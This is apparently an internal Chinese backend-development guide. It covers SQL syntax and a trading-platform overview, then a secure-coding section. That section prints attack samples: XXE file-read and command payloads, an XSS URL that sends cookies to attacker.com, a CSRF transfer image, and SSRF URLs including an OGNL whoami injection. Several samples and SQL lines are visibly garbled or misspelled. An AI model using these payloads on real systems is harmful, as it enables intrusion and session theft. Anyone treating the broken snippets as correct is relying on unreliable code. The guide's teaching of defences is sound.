[OWNER =db_owner]:指定数据库的所有者，即拥有该数据库的用户。
[ENCODING =encoding]:设置数据库字符集编码。常见编码包括 UTF-8、LATIN1 等。
[LC_COLLATE=lc_collate):设置字符串排序规则(colation)，决定如何对字符串进行比较和排序。通常基于语言和区域设置。
[LC_CTYPE=lc_ctype]:设置字符分类规则(ctype)，决定字符的分类方式，如字母、数字等。通常基于语言和区域设置。
[DBCOMPATIBILITY=compatibility_level]:设定数据库的兼容性级别。如果数据库管理系统支持不同的兼容性模式，可以通过此参数设置。

创建数据库示例:
CREATE DATABASE mydb1;  --创建数据库
CREATE DATABASE mydb2 with owner=jack encoding='UTF-8' LC_COLLATE='zh_CN.UTF-8' LC_CTYPE='Zh_CN.UTF-8'  DBCOMPATIBILITY='A'  TABLESPACE=tbS1 CONNECTION LIMIT=1000;   --指定了数据库mydb的拥有者(owner)、编码(encoding)、字符集(LC COLLATE)、字符分类(LC_CTYPE)、兼容模式(DBCOMPATIBILITY)、默认表空间(TABLESPACE)、并发连接限制(CONNECTION LIMIT)

ALTER DATABASE语句用于修改数据库属性:
ALTER DATABASE mydb3 rename to mydb4;--修改数据库名
ALTER DATABASE mydb2 owner to user1;--修改数据库所有者
ALTER DATABASE mydb2 set tablespace tbs1; --修改数据库所属表空间
ALTER DATABASE mydb SET timezone TO 'UTC: --设置timezone为UTC
ALTER DATABASE database name RESET parameter name; --重置timezone参数

DROP DATABASE语句删除数据库:
DROP DATABASE mydb4;

使用CREATE TABLE AS可以根据查询结果创建表。
表的字段和SELECT输出字段的名字及数据类型相关
默认用来自SELECT命令的结果填充该表。指定WITH NO DATA时，不填充表数据。
CREATE TABLE emp1 as select * from emp where sal<2000; --使用查询语句结果创建表
CREATE TABLE emp2 as table emp;--使用已存在的表创建表

添加列full_masks
ALTER TABLE training ADD full_masks lNT;
删除列course_period
ALTER TABLE training DROP course_period;
修改列的数据类型
ALTER TABLE training MODlFY course_name VARCHAR(20);
添加约束
ALTER TABLE training ADD CONSTRAlNT ck_training CHECK(staff id>0);
ALTER TABLE training ADD CONSTRAlNT uk_training UNlQUE(course_name);

DROP TABLE IF EXISTS training;
注意:
DROP TABLE会强制删除指定的表，删除表后，依赖该表的索引会被删除，而使用到该表的函数和存储过程将无法执行。删除分区表，会同时删除分区表中的所有分区
只有表的所有者或者被授予了表的DROP权限的用户才能执行DROP TABLE，系统管理员拥有该权限

TRUNCATE TABLE test1;
注意:
TRUNCATE TABLE仅删除表中的数据，不会删除表的结构定义(列、约束、索引等)
与DROP TABLE不同，TRUNCATE TABLE 不会触发与表相关的删除操作，比如删除触发器、索引或依赖关系
TRUNCATE TABLE 通常比DELETE FROM table_name更快，因为它是一个DDL语句，可以更有效地释放表空间
```

***索引管理***
```txt
在表posts上创建索引:
--创建普通表posts。
CREATE TABLE posts(post_id CHAR(2) NOT NULL, post_name CHAR(6) PRIMARY KEY, basic_wage INT,basic_bonus INT);
--创建索引idx_posts。
CREATE INDEX idx_posts ON posts(post_id Asc, post_name);

创建不同类型的索引:
CREATE UNIQUE INDEX t1_fn_idx on t1(relfilenode);       --创建唯一索引
CREATE INDEX t1_owner_tbs_idx on t1(relowner,reltablespace);      --创建复合索引
CREATE INDEX t1_lttbs_idx on t1 (reltablespace) where reltablespace<20;     --创建部分索引
CREATE INDEX t1_upname_idx on t1(upper(relname));     --创建函数索引
CREATE INDEX pt1_id_idx on pt1(id) local;    --创建分区表的本地索引
CREATE INDEX pt1_score_idx on pt1(score) global tablespace tbs1;    --创建分区表的全局索引
重建索引:
ALTER INDEX idx_posts REBUILD;
重命名索引:
ALTER INDEX idx_posts RENAME TO idx_posts_temp

语法格式:
DROP INDEX [ CONCURRENTLY ] [ IF EXISTS ] 
Index_name [, …] [ CASCADE | RESTRICT ];
参数说明:
IF EXISTS: 索引不存在时，直接返回成功。
index_name: 待删除索引名。
CASCADE | RESTRICT: CASCADE表示允许级联删除依赖于该索引的对象，RESTRICT表示有依赖于此索引的对象存在则索引无法被删除。
示例:
DROP INDEX IF EXISTS idx_posts ON posts;
```

***视图管理***
```txt
语法格式:
CREATE [ OR REPLACE ] VIEW [ schema_name. ]view_name [ ( alias [ … ] ) ] AS subquery

参数说明:
OR REPLACE:创建视图时，若视图存在则更新
schema_name.view_name:视图名
alias:视图列别名，若不给出，将根据后面子查询自动推导列名
AS subquery:子查询

示例:创建视图privilege_view，若该视图存在则更新该视图
CREATE OR REPLACE VlEW training_view AS SELECT staff id, score from training;

示例:创建视图privilege_view并指定视图列别名，若该视图存在则更新该视图
CREATE OR REPLACE VlEW training_view(id,course,date,score) AS SELECT * FROM training;
语法格式:
ALTER VIEW view_name AS SELECT column1, column2, … FROM table_name WHERE condition;

注意事项：
ALTER VIEW 语句只能修改视图的定义，而不能修改视图所基于的表结构
修改视图时，视图中的列名和数据类型必须与从表中选择的列相匹配，否则可能会出现错误
一些数据库管理系统可能不支持修改视图的操作，或者对于复杂的视图，可能需要使用CREATE ORREPLACE VIEW 语句重新创建视图

示例：
ALTER VIEW my_view ASSELECT new_column, column2 FROM table_name WHERE condition;
ALTER VIEW语句还用于修改视图属性
重命名视图:
ALTER VIEW v1 rename to v2;
修改视图属主:
ALTER VIEW v2 owner to jack;
修改视图模式:
ALTER VIEW v2 set schema jack;
语法格式:
DROP VIEW [IF EXISTS][ schema_name. ] view_name
参数说明:
IF EXISTS:视图存在，则执行删除
schema_name.view_name:待删除的视图
示例:
DROP VIEW IF EXISTS privilege_view;
```
***数据插入***
```txt
向表training1中插入数据。
创建表training1。
CREATE TABLE training1 (staff_id INT NOT NULL,course_name CHAR(50),exam_date DATE,score INT);
值插入:向表training1中插入一条记录。
INSERT INTO training1(staff_id,course_name,exam_date,score) VALUES (1,'informationsafety','2017-06-26 12:00:00',95);
查询插入:通过子查询向表training1表中插入training表的所有数据。
INSERT INTO training1 SELECT * FROM training;
主键冲突错误，执行UPDATE操作。
--创建主键
ALTER TABLE training1 ADD PRIMARY KEY (staff_id);
--插入记录
INSERT INTO training1 VALUES (1,'master all kinds of thinking methonds''2017-07-2512:00:00',97) ON DUPLICATE KEY UPDATE course_name = 'master all kinds of thinkingmethonds',exam_date ='2017-07-25 12:00:00',score = 97;
```
***数据修改***
```txt
更新表中行的值。
UPDATE [ ONLY ] table_name [ * ][ [ AS ] alias ]
SET {column_name ={ expression | DEFAULT }
| ( column_name [, …] )={( { expression | DEFAULT } [, …] ) |sub_query }}[, ...]
| FROM from_list] [ WHERE condition ]
[ RETURNING {*
| {output_expression [ [ AS ] output_name ]} [, …] } ];

参数说明。
table_name: 要更新的表名
column name: 要修改的字段名
sub_query: 使用子查询的方法来更新这个表
Condition: 一个返回boolean类型的表达式，只有在这个表达式返回true的行才会被更新
```

***数据更新***
```txt
功能描述:
MERGE INTO将目标表和源表中数据针对关联条件进行匹配，若关联条件匹配时对目标表进行UPDATE，无法匹配时对目标表执行INSERT。
语法格式:
MERGE INTO table_name [ [ As ] alias ]
USING { { table_name | view_name } | subquery } [ [ As ] alias ]
ON (condition )
[
  WHEN MATCHED THEN
  UPDATE SET { column_name ={ expression | DEFAULT }
  | ( column_name [, …] )=( { expression | DEFAULT } [, ..]」 )} , …]
  [ WHERE condition ]
]
[
  WHEN NOT MATCHED THEN
  INSERT { DEFAULT VALUES |
  [ ( column_name [, ...] ) ] VALUES ( { expression | DEFAULT } [ , …] ) [, ...] [ WHERE condition ] }
];
示例:
MERGE INTO target_table AS T -- 目标表使用别名 T
USING source_table AS S    --使用源表使用别名 S
ON (T.id = s.id)      --根据 id 列匹配目标表和源表的行
WHEN MATCHED THEN       --当匹配成功时执行更新操作
  UPDATE SET 
    T.name = S.name, -- 更新目标表的 name 列为源表的 name 列
    T.value = S.value    -- 更新目标表的 value 列为源表的 value 列
WHEN NOT MATCHED THEN        --当匹配不成功时执行插入操作
  INSERT(id, name,value)      -- 向目标表插入新行的列:id, name, value
  VALUES(S.id,S.name, S.value);     -- 插入的值来自于源表的对应列
```
***数据删除***
```txt
功能描述:
从表中删除行。
语法格式:
DELETE FROM [ ONLY ] table_name [ * ] [ [ AS ] alias ]
[ USING using_list ]
[ WHERE condition | WHERE CURRENT OF cursor_name ] [ LlMIT row_count ]
[ RETURNING { * |{ output_expr [ [ AS ] output_name ] } [, ...] } ];
主要参数:
table_name: 目标表的名称
condition: 一个返回boolean值的表达式，用于判断哪些行需要被删除。
示例:
创建表tpcds.customer_address_bak
CREATE TABLE tpcds.customer_address_bak AS TABLE tpcds.customer_address;
删除tpcds.customer_address_bak中ca_address_sk小于14888的职员
DELETE FROM tpcds.customer_address_bak WHERE ca_address_sk< 14888;
删除tpcds.customer_address_bak中所有数据
DELETE FROM tpcds.customer_address_bak;
删除tpcds.customer_address_bak表
DROP TABLE tpcds.customer_address_bak;
```

***数据库控制语言DCL***       
 数据库控制语言（Data Control Language，简称 DCL）是 SQL（结构化查询语言）的重要子集，核心作用是 “控制数据库的访问权限” 与 “保障事务的一致性”—— 前者确保数据不被非法访问或篡改，后者避免多操作并发时出现数据混乱，是数据库安全与数据完整性的 “守护者”。
作用对象：数据库的 “用户 / 角色”（权限管理）和 “事务”（一致性控制）；
操作目标：解决 “谁能操作数据”（权限）和 “操作如何生效”（事务）两大问题；
与其他 SQL 子集的边界：DCL 不直接操作表结构（DDL）或表数据（DML），而是为 DDL、DML 的安全执行提供 “规则与保障”。


### 开发工具指南

`Visual Studio` 最强C++代码调试：Visual Studio 是微软推出的强大集成开发环境（IDE），支持多种编程语言和平台开发，提供智能代码编辑、调试和版本控制工具，适用于 Windows、Web、移动及云应用。号称宇宙最强IDE
适用性：选择开发工具时，需考虑项目需求、团队熟悉度及工具支持的语言和框架，确保工具能有效提升开发效率和质量。
高性能和稳定性是选择开发工具的重要依据，工具应能承受项目规模增长，保持响应迅速且错误率低。
强大的社区支持和丰富的插件生态可以极大地扩展开发工具的功能，加速问题解决过程，提高开发效率。

### KGBP业务开发指引

**KGBP具备什么特点**
高可用： 一主多副+仲裁机组成集群，高冗余、无单点故障，主本故障切换。
高可靠： 即使worker进程由于某种原因意外终止，守护进程会自动检测并拉起新的worker进程，确保系统能够继续正常运行
高性能： 采用低时延软件技术，如无锁技术、环形数组、事件驱动型，内存数据库，缓等。
多通道： 数据传输、排队、通道分发均与业务处理隔离。多种任务分发模式。
插件化： 独立的插件模块能够降低系统的皇杂度，使得系统更易于维护。通过插件化架构，可以容易地引入新的功能模块，而不必对整个系统进行里构。


### 资管
![投资者](/images/szkingdom/szbackend-ziguan1.png)
![金融产品](/images/szkingdom/szbackend-ziguan2.png)

![产品类型](/images/szkingdom/szbackend-ziguan3.png)
![资管机构](/images/szkingdom/szbackend-ziguan4.png)
![资管机构](/images/szkingdom/szbackend-ziguan5-1.png)
![资管机构](/images/szkingdom/szbackend-ziguan5-2.png)

![金融产品](/images/szkingdom/szbackend-ziguan6.png)

交易流程-资产端
指令创建（账户，证券代码，价格，数量，金额）（价格上下限，数量上下限）
风控检查（持仓/市值，交易额/交易量，价格偏移度）（预警，风控审批，禁止）
头寸检查（资金可用，持仓可用）（允许透支，不允许透支）
指令生成
指令审批（流程审批，风控审批）（单级审批，多级审批）
指令分发（手动分发，自动分发）
指令执行（手工执行，算法交易）
报单（场外-报单，银行间-报价）（交易撮合）
成交回报（场外-交易确认）（资产薄记）
清算交收（结算文件，资产簿记）

### 安全预防与措施
***SQL注入***
SQL注入是一种数据库攻击手段。攻击者通过向应用程序提交恶意代码来改变原SQL语句的含义，进而执行任意SQL命令，达到入侵数据库乃至操作系统的目的。
防范措施：
1、参数化查询：不要直接拼接SQL语句，所有的查询语句建议使用数据库提供的参数化查询接口，使用参数化的语句而不是将用户输入的变量嵌入SQL语句中。             
```java
// 创建 PreparedStatement 对象
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
stmt = conn.prepareStatement(query);
// 设置参数值
String username ="admin";
String password="password123";
stmt.setString(1,username),
stmt.setString(2,password),
// 执行查询
rs = stmt.executeQuery();
```
上述代码使用PreparedStatement来执行参数化查询。通过设置占位符（?）并使用setString()方法设置参数值，可以避免SQL注入攻击。
2、输入验证与过滤：可以使用正则表达式和内置的输入验证方法来实现输入验证和过滤。
```java
// 定义白名单正则(允许字母、数字、下划线，长度2-20)
String regex ="^[a-zA-Z0-9_]{2,20}$";
if(name == null||!name.matches(regex)){
  throw new IllegalArgumentException("用户名包含非法字符");
}
```
3、最小权限原则：限制数据库账号权限，避免过度授权，比如使用的数据库账号仅拥有SELECT、INSERT权限，而非DROP TABLE或ADMIN权限。

***失效的身份认证***
失效的身份认证漏洞（Broken Authentication）是指应用程序在管理用户身份验证（登录）和会话管理（维持登录状态）的过程中存在缺陷，使得攻击者能够破坏密码、密钥、会话令牌，或者利用其他实现缺陷来临时或永久地冒充其他用户的身份。
**弱密码策略**： 允许用户设置长度短、复杂度低（如全是数字、无特殊字符），比如123456，admin，password等等。
**不安全的密码存储**： 在数据库、日志文件、配置文件中以明文形式存储密码，或者使用弱哈希算法（如MD5, SHA1）且不加密存储。一旦数据库泄露（SQL注入等），攻击者可以直接获取或轻易破解（使用彩虹表或暴力破解）用户密码。
**会话固定**： 会话固定攻击（Session Fixation Attack）是一种针对Web应用程序会话管理机制的攻击方式，其核心原理是攻击者强迫受害者使用一个攻击者已知的会话标识符（Session ID）。当受害者使用该Session ID进行身份验证后，攻击者就能利用这个已知的Session ID冒充受害者身份，劫持其会话。
![会话固定攻击](/images/szkingdom/szbackend-AQ1.png)
![会话固定攻击](/images/szkingdom/szbackend-AQ1-1.png)
**URL中暴露会话ID**: 
在URL中传递会话ID（如?sessionid=12345），URL可能被记录在浏览器历史、服务器日志、Referer头中，或被共享给他人，导致会话ID泄露。攻击者直接使用窃取的会话ID冒充合法用户，完全接管账户（如登录态、购物车、支付权限）。
**防范措施：**
1、实施强密码策略：比如强制最小长度（12+字符），要求混合大小写字母、数字和特殊字符，禁止常见密码和与用户名相关的密码等等。
2、安全的密码存储：绝对不要明文存储密码，使用强自适应哈希算法（如Argon2id, scrypt, bcrypt, PBKDF2）加密后存储，并对每个密码使用唯一且足够长的密值。
3、防御凭证暴力破解：实施严格的登录尝试速率限制（例如，每分钟每个IP/账户最多5次尝试）。超过阈值后，使用渐进式延迟或临时锁定账户（需结合安全解锁机制，如邮件确认或客服）。
4、安全的会话管理：生成长且高度随机的会话ID；始终通过HTTPS传输会话令牌。实现合理的会话超时（空闲超时和绝对超时），用户登出后，立即在服务器端使会话失效；避免在URL中传递会话ID。

**越权访问**
越权漏洞是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第二名。越权漏洞的成因主要是由于程序在设计或者代码实现上没有考虑权限控制或权限验证不充分，就容易出现越权漏洞。
![越权访问](/images/szkingdom/szbackend-AQ2.png)

**水平越权**：指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。
![水平越权访问漏洞](/images/szkingdom/szbackend-AQ2-1.png)
**垂直越权**：指的是一个低级别攻击者尝试访问高级别用户的资源。由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的，导致普通用户可以执行只有超级用户才拥有的操作。
![垂直越权访问漏洞](/images/szkingdom/szbackend-AQ2-2.png)

**防范措施：**
1、前后端同时对用户输入信息进行校验，双重验证机制
2、调用功能前验证用户是否有权限调用相关功能
3、执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
4、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
5、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤   

***XXE漏洞***
XML外部实体注入(XML External Entity Injection) 也称为XXE，是一种针对应用程序解析XML输入类型的攻击。当包含对外部实体的引用的 XML输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造。

XML（可扩展标记语言）是一种常用于Web应用程序的数据格式。外部实体是一种特殊类型的实体，它们的内容被定义在XML文档外部。

XXE漏洞发生在当应用程序解析含有外部实体引用的XML文档时，没有正确地限制或禁止这些外部实体的使用。攻击者可以利用这一点，通过构造包含恶意外部实体的XML文档，来实现攻击目的。

攻击类型
1、本地文件读取：利用file://协议获取敏感文件。
```xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE creds[
<!ELEMENT test ANY><!ELTITY xxe SYSTEM="file:///ect/password"]>
<creds>
<test>&xxe</test>
</creds>
```
2、内网探测：利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢。
```xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE creds[<!ELEMENT test ANY>
<!ELTITY xxe SYSTEM="http://127.0.0.1.22"]>
<creds>
<test>&xxe</test>
</creds>
```
3、命令执行：利用xxe漏洞可以调用except://伪协议调用系统命令，需要后台支持except，否则无法执行成功。
```xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE creds[<!ELEMENT test ANY>
<!ELTITY xxe SYSTEM="except://id"]>
<creds>
<test>&xxe</test>
</creds>
```
防范措施：
1、禁用外部实体；
2、过滤用户提交的XML数据。过滤关键词为<!DOCTYPE、<!ENTITY、SYSTEM和PUBLIC。

***XSS跨站脚本攻击***
跨站脚本攻击（Cross-Site Scripting，XSS）是一种通过注入恶意脚本到受信任网页中，利用用户浏览器执行这些脚本以窃取信息或实施攻击的网络安全漏洞。

XSS的核心在于利用网站对用户输入的信任，将恶意脚本（如JavaScript）注入网页。当用户访问包含恶意代码的页面时，浏览器无法区分合法脚本与攻击脚本，导致恶意代码执行。

攻击过程分为三步：
1、构造恶意代码：攻击者将脚本嵌入URL、表单或存储内容中。
2、服务端处理与输出：服务器未对用户输入充分过滤或转义，直接将恶意代码返回至页面。
3、浏览器解析执行：用户浏览器解析页面时执行恶意脚本，窃取Cookie、会话令牌等信息，或篡改页面内容。

**1. 反射型XSS(非持久型)**
反射型XSS攻击指的是服务端应用在收到客户端的请求后，未对请求中的参数做合法性校验或安全过滤，直接将参数用于构造HTML页面并返回给浏览器显示。如果参数中包含恶意脚本，就会以HTML代码的形式被返回给浏览器执行。

比如下面的例子，攻击者构造窃取Cookie的链接，用户点击后，Cookie被发送至攻击者服务器，导致会话劫持。
```txt
http://vulnerable-site.com/search?query=<script>fetch("http://attacker.com/steal?cookie='+document.cookie)</script>
```
***2.基于DOM的XSS***
DOM型XSS其实是一种特殊类型的反射型XSS，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。
DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。
```html
<html><head><title>DoM Based Xss Demo</title>
<script>
function xsstest(){
let str = document.getElementById("input").value;
document.getElementById("output").innerHTML ="<img src='"+str+"'></img>" }
</script>
</head><body>
<div id="output"></div>
<input type="text" id="input" size=50 value="" />
<input type="button" value="submit" onclick="xsstest()” />
</body>
</html>
```
这段代码中，submit按钮的onclick事件调用了xsstest()函数。而在xsstest()中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，造成了基于DOM的XSS漏洞。
***3.存储型XSS(持久型)***
在存储型XSS攻击中，服务端应用将攻击者提交的恶意代码存储在服务端，受害者每次访问一个“干净”的URL时，服务端就在响应页面中嵌入之前存储的恶意代码，这些恶意代码将在受害者客户端执行。
由于不需要受害者的请求中夹带恶意代码，因此这种XSS攻击更加稳定，危害性也更大。存储型XSS攻击举例如下：
1、假设一个博客系统存在存储型XSS漏洞；
2、攻击者撰写一篇包含恶意JavaScript代码的博客文章并发表至博客系统；
3、待包含恶意JavaScript代码的文章发表之后，所有访问了该博客文章的用户，其浏览器都会执行这段恶意的JavaScript代码，攻击者便顺利实施了存储型XSS攻击。

防范措施：
1、反射型/存储型XSS：输入验证与过滤：严格校验用户输入（长度、类型、格式）输出编码：根据上下文（HTML/JS/CSS）对动态内容编码。       
2、DOM型XSS：避免使用innerHTML、document.write等危险API。对从location、localStorage获取的数据进行严格验证。

***CSRF(跨站请求伪造)***
跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。
![CSRF(跨站请求伪造)](/images/szkingdom/szbackend-AQ3.png)

**CSRF攻击步骤**
1、用户验证：用户登录受信任的网站（如银行系统），通过cookie维持会话，这一步只有用户才能操作，这是攻击的前提。
2、恶意网站：黑客通过各种方式诱骗用户在不知情的情况下访问恶意网站。
3、未经授权的请求：恶意网站使用已认证用户的凭据（通常通过cookie）向受信任网站发送请求，这个请求被精心设计，以在受信任网站上执行操作，而用户对此并不知情或未经同意。
恶意网站的程序可能就是一张图片：
```htm
<img src="https://bank.example.com/transfer?amount=1000&to=attacker" />
```
图片中的脚本就会执行JavaScript脚本，携带受信任的网站的Cookie向受信任的网站发送请求。

***SSRF（Server-Side Request Forgery，服务器端请求伪造）***
SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。

SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。
![SSRF（Server-Side Request Forgery，服务器端请求伪造）](/images/szkingdom/szbackend-AQ4.png)
**常见攻击场景**
1、访问本地和内部服务：攻击者可以通过伪造请求访问本应无法直接访问的内网服务或本地接口。
```txt
内部数据库：攻击者可以请求http://localhost:3306(MySQL服务端口)或http://localhost:6379(Redis服务端口)
内部API：攻击者可能访问内部的RESTFUL API或其它仅限内网访问的服务。
```
2、利用文件协议泄露信息：攻击者可以通过伪造请求，利用 file:// 或其他协议，访问文件系统中的敏感文件（例如 /etc/passwd 或 /proc/self/environ），获取关于服务器环境的敏感信息。
```txt
Windows:
http://localhost/ssrf.php?url=file:///c:\\windows\\csup.txt
LinuX:
http://localhost/ssrf.php?url=file:////etc/csup.txt
```
3、扫描内部网络，获取端口，服务信息
```txt
探测内网 IP192.168.1.124 的 80 端口(这里用的是 http,协议当然也可以把 http,更换成 dict 协议去探测开放端口)
http://localhost/ssrf.php?url=http://192.168.1.124:80
```
4、对内部主机和端口发送请求包进行攻击
```txt
以下是针对内网 192.168.1.139 这台服务器进行攻击，执行命令 whoami
http: //localhost/ssrf.php?url=http://192.168.1.139:8081/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getclass().getDeclaredfield('allowstaticMethodAccess),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@tostring(@java.lang.Runtime@getRuntime().exec(whoami).getInputStream())}.action
```
**防范措施：**
1、输入验证： 对所有由用户提供的输入（特别是 URL）进行严格验证和清理，避免恶意的外部请求。可以通过白名单、正则表达式等方式来限制可访问的地址范围。
2、网络访问控制： 限制服务器能够发出的请求范围，禁止服务器访问外部和内部敏感服务，尤其是本地地址（如 localhost、127.0.0.1 和其他本地网络地址）。
3、内部资源隔离： 确保内网和外网之间的资源严格隔离。敏感的内部服务应该通过专门的认证和授权方式进行访问。
4、使用网络防火墙： 配置防火墙，禁止从应用服务器发出的内部请求，尤其是针对内部 IP 地址段的请求。
5、应用安全更新： 定期检查并更新应用程序和服务器软件，修补任何可能导致 SSRF 漏洞的安全问题。
6、日志和监控： 监控和记录所有出站网络请求。及时发现异常请求并采取响应措施。

***远程命令/代码执行漏洞***
一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。

同样的道理，因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。
**Windows管道符**
![Windows管道符](/images/szkingdom/szbackend-AQ5.png)

防范措施：
1、输入验证与过滤：对所有的用户输入进行严格的验证和过滤，防止恶意数据注入。采用白名单策略来定义哪些类型的输入是可接受的，而不是尝试枚举所有可能的恶意输入形式。
2、最小权限原则：运行服务或应用程序时，使用尽可能低的权限级别。避免以管理员或root用户运行不必要的服务，这样即使发生RCE漏洞，攻击者也无法获得系统的完全控制权。
3、安全编码实践：尽量避免使用eval(), system(), exec()等危险函数。特别注意处理外部输入的地方，比如SQL查询、命令行参数等，避免直接拼接字符串构造这些操作。

***反序列化漏洞***
反序列化漏洞（Deserialization Vulnerability）是一种安全漏洞，存在于应用程序中对数据进行反序列化操作的过程中。当应用程序接收到外部传递的恶意序列化数据并进行反序列化时，攻击者可以利用这个漏洞执行未经授权的代码或导致应用程序受到攻击。
![反序列化漏洞](/images/szkingdom/szbackend-AQ6.png)

防范措施：
1、避免反序列化不可信数据：不要对来自不受信任源的数据进行反序列化。
2、尽可能采用安全的替代方案，如 JSON 或 XML 数据传输      

***任意文件上传和读取下载***
1. **任意文件上传漏洞**
任意文件上传漏洞指的是攻击者能够利用应用程序的文件上传功能，上传恶意脚本或可执行文件到服务器上，并在某些情况下执行这些文件。这通常发生在没有对上传文件进行严格的验证和过滤时。

漏洞原理：
1、文件类型验证缺失：未检查或限制上传文件的类型，允许上传可执行脚本（如.php, .asp, .jsp等）。
2、文件内容校验不足：即使文件扩展名看似合法，但内容可能被篡改以包含恶意代码。
3、路径遍历攻击：攻击者通过修改文件路径参数来访问或覆盖服务器上的任意文件。

2. **任意文件读取/下载漏洞**
该漏洞源于代码未对用户请求的文件路径进行严格校验，允许攻击者通过构造恶意路径（如 ../）实现目录遍历，从而下载或读取服务器上的敏感文件（如配置文件、日志、密钥等）。常见于文件下载接口、文件预览功能或 URL 参数包含 file、path 等关键词的场景。

漏洞原理：
1、缺乏输入验证：如果应用程序直接使用用户提供的文件路径而不做任何验证，则可能会导致任意文件读取。
2、路径穿越攻击：通过使用../或其他特殊字符，攻击者可以尝试访问超出预期范围的文件。

防范措施：
1、任意文件上传漏洞：1）对上传文件的类型进行白名单限制。2）确保上传目录无法被执行。3）在上传前检查文件大小，避免大文件导致的DoS攻击。
2、任意文件下载/读取漏洞：1）路径规范化与校验：确保文件路径在合法范围内。2）过滤敏感字符：使用正则表达式过滤 ../ 等字符。3）白名单限制：仅允许下载指定目录下的文件，如通过数据库映射文件名与存储路径。